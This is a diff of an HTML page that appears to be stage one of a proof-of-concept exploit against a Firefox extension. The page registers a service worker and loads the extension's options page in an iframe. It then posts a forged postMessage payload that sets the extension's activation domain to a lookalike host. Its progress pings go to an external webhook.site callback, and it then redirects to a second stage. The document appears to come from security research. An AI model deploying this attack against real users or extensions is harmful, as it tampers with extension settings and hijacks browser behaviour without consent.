@@ -1,38 +1,48 @@
 <!DOCTYPE html>
 <html>
-<head><title>Stage 2</title></head>
+<head><title>Stage 1</title></head>
 <body>
   <script>
     async function run() {
-      fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=2_arrived');
+      // 1. Register Service Worker & Wait for Active Control
+      const reg = await navigator.serviceWorker.register('/sw.js', { scope: '/' });
+      await navigator.serviceWorker.ready;
 
-      // 1. Give cs.js 3 full seconds to inject, run SW import, and send updateLastUrl message
-      await new Promise(r => setTimeout(r, 3000));
+      if (!navigator.serviceWorker.controller) {
+        await new Promise(resolve => {
+          navigator.serviceWorker.addEventListener('controllerchange', resolve, { once: true });
+        });
+      }
 
-      // 2. Open options iframe to reset activateOn
+      // Keepalive fetch to ensure Webhook receives 1_sw_active
+      fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=1_sw_active', { keepalive: true });
+
+      // 2. Open options iframe
       const iframe = document.createElement('iframe');
       iframe.src = 'moz-extension://09a6c422-a354-447d-b4ea-185cb10be869/options.html';
       document.body.appendChild(iframe);
 
       iframe.onload = () => {
+        // Send payload repeatedly to guarantee options.js picks it up
         const payload = {
-          activateOn: 'https://doc.rust-lang.org/',
-          href: 'https://doc.rust-lang.org/',
-          url: 'https://doc.rust-lang.org/',
+          activateOn: 'https://doc.rust-lang.org.serverpit.com',
+          href: 'https://doc.rust-lang.org/?bypass=1',
+          url: 'https://doc.rust-lang.org/?bypass=1',
           data: {
-            activateOn: 'https://doc.rust-lang.org/',
-            href: 'https://doc.rust-lang.org/'
+            activateOn: 'https://doc.rust-lang.org.serverpit.com',
+            href: 'https://doc.rust-lang.org/?bypass=1'
           }
         };
 
         iframe.contentWindow.postMessage(payload, '*');
 
-        fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=redirecting_to_target');
+        // Ping to confirm postMessage fired
+        fetch('https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?stage=1_postmessage_sent', { keepalive: true });
 
-        // 3. Wait 3 seconds for async storage write to settle before redirecting
+        // Wait 3.5 seconds to ensure storage write finishes before navigating to stage2
         setTimeout(() => {
-          window.location.href = 'https://doc.rust-lang.org/stable/std/';
-        }, 3000);
+          window.location.href = '/stage2.html';
+        }, 3500);
       };
     }
     run();
